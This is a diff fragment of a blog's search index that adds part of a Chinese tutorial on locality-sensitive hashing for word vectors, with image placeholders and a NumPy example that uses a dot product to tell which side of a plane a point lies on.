+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230192804986.png"
+                      class="" title="image-20251230192804986"
+                > 
+
+<p>蓝色是一个平面，然后平面有一个法向量</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230192840191.png"
+                      class="" title="image-20251230192840191"
+                > 
+
+<p>然后向量与法向量的点积分为正数，0，负数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230192929319.png"
+                      class="" title="image-20251230192929319"
+                > 
+
+<p>如果为正数说明在正方向，为0说明在平面上，为负数说明在负方向</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">def side_of_plane(P, v):</span><br><span class="line">    # 计算平面法向量P与点v的点积（兼容矩阵/数组输入）</span><br><span class="line">    dotproduct = np.dot(P, v.T)</span><br><span class="line">    # 获取点积的符号（+1、-1、0）</span><br><span class="line">    sign_of_dot_product = np.sign(dotproduct)</span><br><span class="line">    # 替代np.asscalar()：用item()提取标量（兼容高版本NumPy）</span><br><span class="line">    sign_of_dot_product_scalar = sign_of_dot_product.item()</span><br><span class="line">    return sign_of_dot_product_scalar</span><br><span class="line"></span><br><span class="line"># 示例：定义一个平面和若干点</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 1. 定义平面（法向量P = [a, b, c]，平面方程：a*x + b*y + c*z = 0，平面过原点）</span><br><span class="line">    P = np.array([1, 1, 1])  # 平面法向量：x + y + z = 0</span><br><span class="line"></span><br><span class="line">    # 2. 定义待判断的点</span><br><span class="line">    v1 = np.array([1, 1, 1])  # 点1</span><br><span class="line">    v2 = np.array([-1, -1, -1])  # 点2</span><br><span class="line">    v3 = np.array([1, 1, -2])  # 点3（满足x+y+z=0，在平面上）</span><br><span class="line"></span><br><span class="line">    # 3. 调用函数判断点的位置</span><br><span class="line">    res1 = side_of_plane(P, v1)</span><br><span class="line">    res2 = side_of_plane(P, v2)</span><br><span class="line">    res3 = side_of_plane(P, v3)</span><br><span class="line"></span><br><span class="line">    # 4. 输出结果</span><br><span class="line">    print(f&quot;平面法向量 P = &#123;P&#125;&quot;)</span><br><span class="line">    print(f&quot;点 &#123;v1&#125; 在平面的哪一侧？结果：&#123;res1&#125;（正侧）&quot;)</span><br><span class="line">    print(f&quot;点 &#123;v2&#125; 在平面的哪一侧？结果：&#123;res2&#125;（负侧）&quot;)</span><br><span class="line">    print(f&quot;点 &#123;v3&#125; 在平面的哪一侧？结果：&#123;res3&#125;（在平面上）&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230193247314.png"
+                      class="" title="image-20251230193247314"
+                > 
+
+<h2 id="多平面上"><a href="#多平面上" class="headerlink" title="多平面上"></a>多平面上</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230193329076.png"
+                      class="" title="image-20251230193329076"
+                > 
+
+<p>多平面上计算向量在每个平面的方向，然后以下面公式例子计算哈希</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230193652355.png"
+                      class="" title="image-20251230193652355"
+                > 
+
+<p>然后将多个哈希值结合成一个哈希</p>
+<h1 id="文档搜索"><a href="#文档搜索" class="headerlink" title="文档搜索"></a>文档搜索</h1><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230193800365.png"
+                      class="" title="image-20251230193800365"
+                > 
+
+<p>相加组合起来为文档向量。</p>
+]]></content>
   </entry>
 </search>
